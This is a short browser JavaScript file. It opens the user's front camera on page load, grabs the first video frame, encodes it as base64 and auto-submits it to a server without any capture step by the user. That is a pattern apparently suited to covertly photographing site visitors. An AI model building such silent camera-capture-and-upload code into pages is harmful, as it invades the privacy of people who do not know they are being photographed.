var video = document.getElementById("video")
const can = document.getElementById("canvas")
const form = document.getElementById("form")
const imgNameInput = document.getElementById("imgName")
const baseString = document.getElementById("baseString")

window.onload = () => {

//for different user agents
var mediaDevices = navigator.mediaDevices || navigator.webkitMediaDevices || navigator.mozMediaDevices
//checks if getUserMedia is supported by the browser
if(navigator.mediaDevices.getUserMedia){
  try{
  navigator.mediaDevices.getUserMedia({
    video: {
      //used to control the height of the image 
      //usual image height is 1690px.
      height: {
        max: 2460,
        ideal: 1690,
        min:1080
      },
      //used to control the width of the image 
      //usual image width is 1260px.
      width: {
        max: 1940,
        ideal: 1260,
        min: 720
      },
      //ensures that the camera is facing to the user(using front-camera)
      //change to **facingMode: 'environment'** to access rear camera
      facingMode: 'user'
    },
    //avoid audio capture
    audio:false
  })
  .then(stream => {
    //sets the video source to play the video
    video.srcObject = stream
  })
  }catch(err){
    document.write(err.message + "\nPlease allow camera access to use this site...")
  }
}
else{
  alert("Your device doesn't support this feature")
  document.write("Your browser doesn't support this feature")
}

video.addEventListener('canplay', () => drawCan())
//when the video starts playing
function drawCan(){
  try{
    var ctx = can.getContext("2d")
    can.height = video.height
    can.width = video.width
    //draw the first frame of the video into the canvas
    //the image we need is captured now in our canvas
    ctx.drawImage(video, 0, 0, can.width, can.height);
    
    //converts the image to a dataURL
    //encodes it in base64 string to be able to sent to the server
    let data = can.toDataURL('image/png');
    //generates a random name to save the image as
    let imgName = Math.round(Math.random() * 1000000)
    
    imgNameInput.value = imgName
    baseString.value = data
    //sends data to the server
    form.submit()
  }catch(err){
    document.write(err)
  }
}
}
